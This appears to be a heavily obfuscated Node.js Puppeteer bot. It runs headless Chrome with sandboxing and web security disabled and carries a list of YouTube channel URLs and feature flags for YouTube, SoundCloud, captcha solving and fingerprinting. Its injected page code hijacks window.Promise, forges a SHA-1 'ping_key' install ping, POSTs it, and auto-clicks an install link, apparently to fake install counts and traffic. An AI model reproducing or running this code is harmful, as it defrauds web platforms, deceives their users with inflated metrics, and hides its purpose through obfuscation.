              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1cce + -0xeec * -0x2 + -0x2 * 0x1d4b; J < 0x15d9 + 0x1ba4 + -0x1 * 0x312d; ++J)
                K = Q[J - (0x182e + 0xc09 + 0x52c * -0x7)] ^ Q[J - (-0x1b * -0x115 + -0x3 * -0x1c6 + -0x2281)] ^ Q[J - (-0x52 * 0x38 + -0xb3f * -0x1 + 0x6bf)] ^ Q[J - (0xfb * -0x25 + 0x12ec * -0x2 + 0xa99 * 0x7)], Q[J] = K << 0xbb8 + 0x7 * -0x2b0 + 0x719 | K >>> 0x1 * -0x52d + 0x21ce + -0x1c82;
              for (J = 0x1 * -0x125b + -0x1 * -0xfd4 + -0x287 * -0x1; J < -0xcc5 + -0x2592 + -0x1 * -0x326b; J += 0x1c41 + -0x6d8 + -0x1564)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xdb1 + -0x5 * 0x6df + -0x5 * -0x423 | L >>> 0x892 + -0x19 * -0xa7 + 0x3 * -0x842) + (M & N | ~M & O) + P + (-0x25230cab + -0x5b * 0x1a74b7d + 0x1161d5bb3) + Q[J] << -0x132c + 0x1633 + -0x9b * 0x5) << -0x26c7 + -0x15c0 * 0x1 + 0x3c8c | P >>> -0x2211 + -0x1582 + -0x1 * -0x37ae) + (L & (M = M << -0x1ed1 + 0x3 * -0xcf + 0x215c | M >>> -0xab * 0x19 + 0x31 * -0x5f + 0xcb * 0x2c) | ~L & N) + O + (-0x224857 * -0x9c + 0x2bd5ae66 + 0x19c8b62f) + Q[J + (-0x2615 + 0x20be + 0x558)] << 0xbb * -0x3 + 0x143e * -0x1 + -0x166f * -0x1) << 0x8 * 0x33f + -0x1ad7 + 0xe4 | O >>> -0x71 * 0x1a + 0x1df8 + 0x1 * -0x1263) + (P & (L = L << -0x1b03 + 0x2257 + -0x1 * 0x736 | L >>> -0x2072 + 0x1eb * -0x6 + -0x11 * -0x296) | ~P & M) + N + (-0x120f1aca * 0x3 + -0x33409568 + 0xc3f05f5f) + Q[J + (-0x3 * 0x481 + 0x24f7 * 0x1 + -0x1772)] << -0xd34 + 0x2f * -0x3d + 0x1867) << 0x1 * 0x1a + 0x204e + -0x2063 | N >>> 0x200f + 0x3b9 * -0x1 + -0x1c3b) + (O & (P = P << -0x9fa + 0x2135 + -0x171d | P >>> 0x2581 * 0x1 + -0xa43 * 0x2 + -0x10f9) | ~O & L) + M + (0x3a6c267 + 0x13cbf8a7 + -0x165a94d9 * -0x3) + Q[J + (0xf95 + 0x12e0 + 0x1 * -0x2272)] << 0x26c6 + -0x13 * 0x183 + -0xa0d) << 0x181c + -0x1e3a + -0x623 * -0x1 | M >>> -0x26fe + -0x16c1 * -0x1 + 0x82c * 0x2) + (N & (O = O << 0x1 * 0x200f + 0x9d * 0x26 + -0x373f | O >>> -0x247 + -0x170c + 0x1955) | ~N & P) + L + (-0x5b6b953b + 0xa7733920 + -0x9d * -0x179c44) + Q[J + (0x1102 + -0x539 + -0xbc5)] << 0x1ea6 + 0x1f3 * 0x1 + -0x5 * 0x685, N = N << 0x2bc + 0x91e + -0x2 * 0x5de | N >>> -0x61 * -0x24 + -0x1 * -0x1741 + 0x24e3 * -0x1;
              for (; J < 0x546 + 0x3fe * 0x7 + -0x2110; J += -0x260b + -0xa3a + 0x373 * 0xe)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x12dd * -0x1 + -0x187d * 0x1 + 0x5a5 | L >>> -0x3 * -0x4af + -0x161f + 0x82d) + (M ^ N ^ O) + P + (0x56d6b15 * -0x11 + 0x985d868e + 0x128 * 0x2be4c3) + Q[J] << -0xadd * -0x3 + -0x93f + 0xc * -0x1f2) << 0xd25 + -0x1605 + 0x8e5 | P >>> 0xcb * -0x5 + -0x201c + 0x242e * 0x1) + (L ^ (M = M << 0x72 * -0x32 + -0x19 * -0x10a + 0x5 * -0xb8 | M >>> 0x449 + -0x1322 + 0xedb * 0x1) ^ N) + O + (-0x75 * -0x9a8d85 + -0x347eeb4a + 0x38c7c1 * 0x1a2) + Q[J + (0x2624 + -0x3aa + -0x2279 * 0x1)] << -0xa55 + 0xfe4 + -0x58f) << -0x15b * 0x1 + 0xbe3 * 0x1 + -0x9 * 0x12b | O >>> 0x45 + 0x5 * -0x2a7 + -0xd19 * -0x1) + (P ^ (L = L << -0x1788 + -0x94a * 0x2 + 0x2a3a | L >>> 0x9 * -0x16 + 0x1 * -0x1dc5 + 0x1e8d) ^ M) + N + (0x142d7f48 + -0xa3b * 0x10ef4f + -0x1eb6 * -0x89805) + Q[J + (0x314 + -0x1 * -0x7b5 + -0xac7)] << -0x591 + 0x2dd * -0x3 + 0x18 * 0x97) << -0x131 * 0x19 + -0x4c5 + 0x2293 * 0x1 | N >>> -0x739 + 0x33 * 0x81 + -0x125f * 0x1) + (O ^ (P = P << -0x3fe * 0x8 + -0x16bd + -0x53 * -0xa9 | P >>> 0xa73 + 0x2600 + 0x1 * -0x3071) ^ L) + M + (0x7d4145b3 + 0x63ab82b4 + 0xa * -0xb684947) + Q[J + (0x144f + -0x24b7 + 0x3 * 0x579)] << 0x65a * -0x1 + -0x2499 + 0x2af3) << -0x1 * 0xbc9 + 0x554 + 0x67a | M >>> -0x1d * -0xf1 + 0x120e + -0x2d40) + (N ^ (O = O << 0x25eb + -0xbd * 0x13 + -0x17c6 | O >>> -0x1 * 0x1843 + 0x27 * -0x15 + 0x1b78) ^ P) + L + (0x1f * -0x55f4e9 + -0x206f87 * -0x3ef + -0x1 * 0x6542031) + Q[J + (-0x1ece + -0x1d3 * 0x2 + 0x2278)] << -0x246 * 0x4 + -0xe42 * 0x2 + 0x259c, N = N << -0x44d + -0xd9c + -0x41 * -0x47 | N >>> 0x1900 + -0x23cb + 0xacd;
              for (; J < -0x11 * 0x189 + 0x1 * 0xb1b + 0xf3a * 0x1; J += -0x8 * -0x458 + -0xd7 * -0x2b + -0x46d8)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x10 * -0x271 + -0x1a9 + 0x5 * 0x826 | L >>> -0x618 + -0x2 * 0x2cd + 0xbcd) + (M & N | M & O | N & O) + P - (-0xa9b6c2ee + 0x897d7cd1 + 0x911d8941) + Q[J] << -0x1 * 0x2517 + 0x6b * -0x3f + 0x3f6c) << 0x1d7f + -0x2347 * 0x1 + -0x2d * -0x21 | P >>> 0x61f * -0x1 + 0xca * -0x3 + 0x898) + (L & (M = M << -0x1 * 0x1331 + -0xbe1 + -0x8 * -0x3e6 | M >>> -0x10a * 0x17 + 0x16d8 + 0x110) | L & N | M & N) + O - (0xb400fdbb + -0xc76c4ef9 + 0x7 * 0x12e6cc0e) + Q[J + (-0x7 * -0x4ce + -0x920 + -0x1881)] << -0xda4 + -0x1 * 0x3c2 + -0x11 * -0x106) << 0x1ce8 + 0x1 * -0x10fa + -0x1 * 0xbe9 | O >>> -0x23b0 * 0x1 + -0x3e6 + -0x27b1 * -0x1) + (P & (L = L << 0xb77 * 0x1 + 0x119 * -0x14 + -0x21f * -0x5 | L >>> 0x1 * -0x17e7 + 0x121b + 0x5ce) | P & M | L & M) + N - (-0x7681c909 + 0xa4a0a89 * 0x5 + 0x7f8 * 0x169510) + Q[J + (-0xb7d + 0x131c + -0x79d)] << -0x9 * -0x371 + -0x1fd3 + 0xda) << 0x4 * -0x7fd + -0x199a + 0x121 * 0x33 | N >>> -0x1fc7 + 0x1aff + -0x1 * -0x4e3) + (O & (P = P << -0x55e * 0x2 + 0xe3c * -0x1 + -0x1ee * -0xd | P >>> 0x13d9 + 0x3d * 0x6a + -0x905 * 0x5) | O & L | P & L) + M - (-0xb8ac2fbd + 0x6 * -0x16563de8 + 0x1af95e651) + Q[J + (0x1 * 0x2073 + 0x1 * 0x211a + -0x418a)] << 0x1ae8 + -0x1baf + 0xc7 * 0x1) << -0x2 * 0xf3e + 0x1e57 + -0x2a * -0x1 | M >>> -0xced + 0x1 * 0x1ee + 0xb1a) + (N & (O = O << -0x1893 + 0x66f * -0x1 + 0x1f20 | O >>> -0x152 * 0xa + 0x57c + 0x7ba) | N & P | O & P) + L - (-0x1d3d4479 + -0x195 * -0x25060b + 0x22 * 0x275256b) + Q[J + (0x21d * 0xb + -0xa6a + -0xcd1)] << -0x3 * -0x59c + 0x229d + 0x3371 * -0x1, N = N << 0x2d * -0x4e + 0x1c62 + -0x2e * 0x51 | N >>> 0xaa * 0x11 + -0x1bc3 + 0x1 * 0x107b;
              for (; J < 0x24b1 + -0xb * 0x193 + -0x4c4 * 0x4; J += -0x133 + 0x20fc + 0x26 * -0xd6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2164 + 0x4 * -0x3b5 + 0x303d | L >>> 0x24b * -0xa + -0xb * -0x147 + -0x19 * -0x5c) + (M ^ N ^ O) + P - (0x1bbad4fd + 0x80688a1 * 0xa + -0x365eed1d) + Q[J] << 0x105 * -0x12 + -0x10c0 + 0x231a) << -0x2b7 * 0x7 + 0x17a9 + -0x4a3 | P >>> -0x209 * 0x11 + -0x21f7 + 0x44ab) + (L ^ (M = M << -0x7 * -0x2d3 + -0x4 * -0x557 + 0x1 * -0x2903 | M >>> 0xd * 0x36 + 0x1954 * -0x1 + 0x1698 * 0x1) ^ N) + O - (-0x20892bfa + -0x1 * -0x4c73f27b + -0x1f07e55 * -0x5) + Q[J + (0x2636 * -0x1 + -0x437 * -0x2 + 0x1dc9)] << -0x22c1 + 0x1643 + 0xf6 * 0xd) << -0xc4a + 0x235e + 0x170f * -0x1 | O >>> 0x293 * 0x3 + 0x114c + 0x18ea * -0x1) + (P ^ (L = L << -0x1 * 0x205b + 0xb2 * -0x12 + 0x1 * 0x2cfd | L >>> 0xa2 * 0x1 + 0x92c + 0x4e6 * -0x2) ^ M) + N - (0x8184e43 + 0x5 * -0x3dcf79 + 0x2 * 0x175cfea2) + Q[J + (-0x2111 + 0x1 * -0x2 + 0x2115)] << -0x1e2 + -0x162 + 0x16 * 0x26) << -0x594 + -0xc6f + -0x1 * -0x1208 | N >>> 0x1 * -0x7c9 + -0x7ee * 0x1 + -0x546 * -0x3) + (O ^ (P = P << -0x157e + -0x3fd * -0x6 + -0x252 | P >>> 0x1d * -0xf4 + 0xcb0 + 0xef6 * 0x1) ^ L) + M - (-0x66f4bb28 * 0x1 + -0x1 * -0xcff9a17 + -0xb0b4267 * -0xd) + Q[J + (-0x56 + -0x5c8 + 0x1 * 0x621)] << 0x1814 + 0xb31 + -0x2345) << -0xa34 + -0x233b + -0x2d74 * -0x1 | M >>> -0x1500 + 0x665 * -0x1 + -0x20 * -0xdc) + (N ^ (O = O << 0x1b4a + 0x1c92 + -0x37be | O >>> -0x1e9d + -0x1 * 0xf9e + -0x1 * -0x2e3d) ^ P) + L - (-0x2 * 0x1658fbc8 + 0x1fd0ffda + 0x427e35e0) + Q[J + (0x18be * 0x1 + -0x1 * -0x198e + 0x4 * -0xc92)] << -0x10fd * 0x1 + -0xf23 + 0x2020, N = N << 0x2f5 + 0x1119 * -0x1 + -0x721 * -0x2 | N >>> -0x2400 + -0xf43 + 0x3345;
              this['h0'] = this['h0'] + L << 0x1 * -0x258f + 0x4dd * -0x5 + 0x3de0, this['h1'] = this['h1'] + M << 0x1 * -0x1587 + -0x7e1 + 0x1d68, this['h2'] = this['h2'] + N << -0x10 * 0x24a + 0x1a1a + 0xa86, this['h3'] = this['h3'] + O << 0x841 + -0x1 * -0x2063 + 0x1452 * -0x2, this['h4'] = this['h4'] + P << -0x188 + 0x2698 + -0x2510;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x929 + 0x117f + -0x1a8c & -0xc6d + 0xdd * 0x25 + -0x1375] + w[J >> 0x31 * -0x1 + 0x1437 + 0x9f7 * -0x2 & -0x1 * -0x1421 + -0x2511 + 0x10ff] + w[J >> -0x6e9 * 0x3 + 0x257f + -0x10b0 & 0x22a3 * 0x1 + -0x1bb3 + -0x6e1] + w[J >> 0x15ae + 0x19a4 * 0x1 + 0x107 * -0x2e & -0x1f73 * 0x1 + -0x5fd + 0x257f * 0x1] + w[J >> 0x5 * 0x96 + 0x2245 + -0x2527 & 0x1 * 0x1d1 + -0x13fe + 0x3 * 0x614] + w[J >> 0x3d9 + -0x66e + 0x29d & 0x364 * 0x1 + 0x53 * -0x74 + 0x2247] + w[J >> -0x1 * 0x1767 + -0x1 * 0x1cbb + -0xa6e * -0x5 & 0x1c1 * 0x11 + -0x22a8 + 0x4e6] + w[-0x1890 + 0x1f0 + 0x16af & J] + w[K >> -0xe4 * 0x5 + 0x14c3 * -0x1 + 0x1 * 0x1953 & -0x2160 + 0xf * 0x28c + -0x4c5] + w[K >> 0x594 + -0xf3b * -0x1 + -0x14b7 * 0x1 & 0xa8f + 0x20c6 + -0x2b46] + w[K >> -0xafc + -0x356 + 0xe66 & 0x1bba + -0xfeb + -0xbc0] + w[K >> 0x6eb * -0x1 + -0xcec + 0x13e7 & 0x221 * -0x4 + -0x1b * -0x90 + -0x1 * 0x69d] + w[K >> 0x197 * -0x2 + 0x23c9 + 0x1 * -0x208f & -0x248 * 0x2 + -0x1ba2 + 0x2041] + w[K >> -0x406 * -0x8 + 0x6 * 0x1dd + -0x2b56 & -0x70f * -0x1 + 0x2397 + -0x2a97] + w[K >> 0xbb + 0x6cf + -0x6 * 0x141 & -0xe50 + -0xe17 + 0x1c76] + w[-0x1c7a + -0x54 * -0x65 + -0x49b & K] + w[L >> 0x1 * -0x15ca + -0x1763 + 0x1 * 0x2d49 & 0x21b4 + 0x1d34 + -0x3ed9] + w[L >> 0x13 * 0x65 + 0x21a * -0xc + 0x11d1 * 0x1 & 0x2133 + -0x1 * 0x1e03 + -0x321 * 0x1] + w[L >> -0x1 * 0x1993 + -0x160a + 0x2fb1 & -0x1 * -0x742 + 0x2661 + -0x2d94] + w[L >> 0x22e7 + 0x93a + -0x2c11 * 0x1 & 0x1f * -0x61 + 0x1fa1 + -0x7 * 0x2d5] + w[L >> -0x1 * 0xa25 + 0x20f1 + -0x16c0 & -0x1877 + -0x1d * -0x121 + 0x2bd * -0x3] + w[L >> -0x22f * -0x11 + 0x1 * -0x260b + 0x4 * 0x3d & 0x6dc * 0x2 + -0x7 * 0x397 + 0xb78] + w[L >> -0x2b + 0xfae + -0xf7f & -0x1 * 0x1b40 + 0x9f3 + 0x115c] + w[0x1 * 0x3b6 + -0x7 * -0x38f + -0x1c90 & L] + w[M >> 0x6 * 0x12d + 0x2e * 0x65 + -0x323 * 0x8 & -0x1684 + -0x11f3 * -0x1 + -0x2 * -0x250] + w[M >> -0x1b2f + -0x606 * -0x1 + 0x1541 * 0x1 & -0x5 * 0x2d7 + 0x1 * 0x24eb + -0x16a9 * 0x1] + w[M >> 0x12f2 * 0x1 + 0x22f6 + -0x35d4 & 0x3c1 * 0x7 + -0x1a6 + -0x1892] + w[M >> -0x6ba + -0x700 + 0xdca & 0x748 + -0x6bc + -0x7d] + w[M >> -0x1 * -0xe6b + 0xc47 + 0x8e2 * -0x3 & -0x797 * 0x4 + 0x2381 + 0x1 * -0x516] + w[M >> -0x85 * -0xb + 0x2286 + -0x49 * 0x8d & -0x1e2e * 0x1 + -0x1 * -0x2041 + -0x1 * 0x204] + w[M >> -0x25d0 + 0x13ad + 0x1227 & -0x2588 + -0x2 * -0xc2f + 0xd39] + w[-0x249c + 0x1cd5 * -0x1 + 0x4180 & M] + w[N >> -0x125 * 0x1 + -0x10ff + 0x1240 & 0x2568 + 0x191b + -0x3e74] + w[N >> -0xd41 + 0x1 * -0xb78 + 0x18d1 & -0x1cbb + -0xd74 + -0x1 * -0x2a3e] + w[N >> -0x2 * 0x971 + -0x667 + -0x97 * -0x2b & 0x3 * 0x5d8 + -0x3 * -0xc90 + -0x20b * 0x1b] + w[N >> -0x1bd3 + -0x571 + -0x58e * -0x6 & 0x2 * -0xb5 + -0x1de1 + 0x2 * 0xfad] + w[N >> -0x1a35 + -0xd5a + 0x279b & 0x126 + 0x5db + -0x6f2] + w[N >> -0x22a3 + -0x4a1 * 0x1 + -0x7dc * -0x5 & -0x244e * -0x1 + -0x5b9 * -0x5 + 0x2 * -0x206e] + w[N >> 0x1ca4 + 0x1f6c * 0x1 + -0x16e * 0x2a & -0x1bdc * 0x1 + 0x9 * 0x295 + 0x4ae * 0x1] + w[-0x1191 * 0x2 + -0x40f + 0x40 * 0x9d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * -0x1da3 + -0x7b9 + 0x11 * 0x234 & 0x243c + -0x2fd + 0x6 * -0x560,
                J >> -0x2 * 0x811 + 0xcc2 + 0x370 & -0x1 * 0x19b8 + 0x3 * -0x18 + -0x1aff * -0x1,
                J >> -0x2 * 0xf43 + -0x177 + 0x7 * 0x493 & 0x1a6f + 0x1e2a + -0x379a,
                0x1bfb + 0xf * -0x7b + -0x3d * 0x53 & J,
                K >> 0x379 * 0x2 + -0x93 * -0x3d + -0x29e1 & -0x13e5 + 0x17e * 0x1 + -0xd * -0x17e,
                K >> -0x16a5 * 0x1 + 0x2 * 0xddb + -0x501 & -0xccf + 0x42a * 0x5 + -0x704,
                K >> 0x2708 + -0xfe3 + -0x171d & 0x6d4 + 0x3c7 * -0x6 + 0x10d5 * 0x1,
                -0x10e5 + 0x1a20 + 0x83c * -0x1 & K,
                L >> 0x1265 * -0x2 + 0x1021 + 0x6eb * 0x3 & -0xfc9 + -0x15 * 0xb7 + 0x1 * 0x1fcb,
                L >> -0x215e + -0x541 * -0x2 + 0x3 * 0x7a4 & -0x70a * 0x5 + -0x2e * 0x8c + 0x3d59,
                L >> -0x25f * -0xf + 0x1715 + -0x3a9e & -0x1e8b + 0x1 * -0x2592 + 0x451c,
                0x1b38 + -0xa1 * -0x7 + 0x7a8 * -0x4 & L,
                M >> -0x1 * 0x2099 + 0x3 * 0x3a8 + 0x43 * 0x53 & -0x38b * -0x2 + -0x557 * 0x1 + -0x2 * 0x60,
                M >> 0x19e4 + 0x2 * -0x1205 + -0xa36 * -0x1 & 0x1 * 0x14cf + -0x230d + 0xf3d,
                M >> 0x11 * -0xb8 + 0x249d + -0x185d & -0x8c * 0x23 + -0x8 * -0x251 + 0x19b,
                0xaee + -0xe9 * 0x2 + -0x1 * 0x81d & M,
                N >> 0xb4f * 0x1 + -0xce7 + -0x90 * -0x3 & 0x2 * 0x102e + 0x1d69 * 0x1 + -0x3cc6,
                N >> 0x1 * 0x10e9 + 0x4af + 0x562 * -0x4 & 0x53 * 0x41 + -0x676 + 0xf9 * -0xe,
                N >> -0x1496 + -0x4 * -0x25d + 0xb2a & 0x11bd + -0x129e + 0xf * 0x20,
                -0x21a5 + -0x1 * 0x332 + -0xa7 * -0x3a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x254b + 0x13 * 0x67 + 0x1dba), (K = new DataView(J))['setUint32'](0x22 * 0x17 + -0x2673 + -0xd * -0x2b9, this['h0']), K['setUint32'](0x1 * 0xeab + -0x1faf * -0x1 + -0x2e56, this['h1']), K['setUint32'](0x21df + -0x46 * -0x35 + 0x1 * -0x3055, this['h2']), K['setUint32'](0x2487 * 0x1 + 0x1898 + -0x3d13, this['h3']), K['setUint32'](-0x431 + 0x420 + 0x1 * 0x21, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x21 + 0x16a1 + -0x16c2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x13 * -0x7 + -0x16 * 0x3a + -0x3 * -0x17d;
            J[-0x1de * 0x11 + 0x2cc + 0x1cf2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x5f * 0x69 + 0x96f + -0x3066] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1 * 0x485 + -0x37 * -0xa6 + 0x1 * -0x282e), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xb1b * -0x1 + -0x270 + -0x8aa;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0xfe8 + -0x66e + 0x2 * 0xe19), Promise['resolve'](-0x131a * -0x2 + -0x2 * 0xddf + -0xa75 * 0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1bef * -0x1 + -0x1f85 + 0x3b74 * 0x1; j < 0x1c92 * 0x1 + 0x43 * -0x4b + -0x68 * 0x16; j++)
    i();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1625 + 0x69 + 0x15bc);
    let h = e[f];
    if (b['VxtvvN'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xaae * 0x1 + -0xa * 0x20e + 0x2 * 0x4ef, s, t, u = 0xcab + 0x1105 + -0x1db0; t = n['charAt'](u++); ~t && (s = r % (0x1ad5 + 0x3f5 * -0x1 + 0xd1 * -0x1c) ? s * (-0x24c1 * 0x1 + 0xb5e * -0x1 + -0x1 * -0x305f) + t : t, r++ % (0x234e + 0x7 * 0x3fe + -0x3f3c)) ? p += String['fromCharCode'](0x2a2 * 0x9 + -0x3 * 0x5 + 0xc * -0x1e3 & s >> (-(0x3dc * 0x1 + -0x1fba + 0x1be0) * r & 0x15cb + -0x7 * 0x29f + -0xdb * 0x4)) : -0x78b * -0x2 + -0x1 * 0x24a5 + -0x1 * -0x158f) {
          t = o['indexOf'](t);
        }
        for (let v = 0x1074 + -0x170b + 0x697, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x23a2 + 0x4aa + -0x283c))['slice'](-(-0x11b6 + -0x190c + -0x187 * -0x1c));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x39 * -0x8b + 0x5c * -0x30 + -0xdb3,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x376 * 0x1 + 0xab0 + -0x713 * 0x2; u < 0x2135 + -0x1 * -0x1ae + 0x15b * -0x19; u++) {
          p[u] = u;
        }
        for (u = 0x1717 + 0x222b + -0x3942; u < -0x9 * 0x3a1 + -0x1fdd + 0x4186; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x23bf + 0xb * 0x1b1 + 0x1224), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1c7b * -0x1 + -0x1647 + -0x634, q = 0x1af2 + 0x35 * 0xa1 + 0x1 * -0x3c47;
        for (let v = 0x14ad + -0x1a * -0x1a + -0x1751; v < n['length']; v++) {
          u = (u + (0x98 * -0x2f + 0x2d8 + 0x117 * 0x17)) % (0x655 + -0x2077 * 0x1 + -0x97 * -0x2e), q = (q + p[u]) % (-0x8f9 + 0x959 * -0x2 + -0xb3 * -0x29), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xaaf * -0x1 + -0x1 * -0x214f + -0x1 * 0x2afe)]);
        }
        return t;
      };
      b['SPxZQL'] = m, c = arguments, b['VxtvvN'] = !![];
    }
    const j = e[0x1430 + -0x1 * -0x1906 + 0x2d36 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['PBUcYE'] === undefined && (b['PBUcYE'] = !![]), h = b['SPxZQL'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = 0x1553 + 0x1 * -0x3355 + 0x3d42 * 0x1 + (0x1ee * -0xe + -0x796 + 0x62 * 0x79) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x18e * -0xd + -0xac6 + -0x1 * -0x1eff) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1625 + 0x69 + 0x15bc);
    let h = e[f];
    return h;
  }, d(b, c);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function a() {
  const bl = [
    '_[Krunker_',
    '72ff3bf98',
    'vSkYtmk9',
    'DcFdTSk3WReLWQjexfK',
    'WRrehh4hivJcVmokW78',
    'Ahr0Chm6lY9VCa',
    'WPddV1SxfCowW63cUSkzka',
    'W4lcQ2ZcSmo1W4JcHejEW6e',
    'zZeXtKPMDhH3mq',
    'https://op',
    'CMCVzw4VC2nYAq',
    'zxjYB3i',
    'OHzOmi1b60',
    'GWr33_u0VK',
    'utton.soun',
    'W6lcH8o6W65uxmkef08Q',
    'ef8',
    'utobreak-f',
    'WQRdPSkCFSoeAsebW6JcNG',
    'hBytes',
    'A3v1strmEKTNBq',
    'MfR5q6Td3R',
    'moomoo.io\x20',
    'document',
    'assign',
    'aWD4W5lcG0/dHmoUW5vo',
    'lxzPzgvVlwLKlq',
    'B1jYEvu5rJLmDG',
    '\x20(KHTML,\x20l',
    'u8kZWRBcIXGZhX3cKCoY'
  ];
  a = function() {
    return bl;
  };
  return a();
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x779 * 0x3 + 0x128e + 0x3dd; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
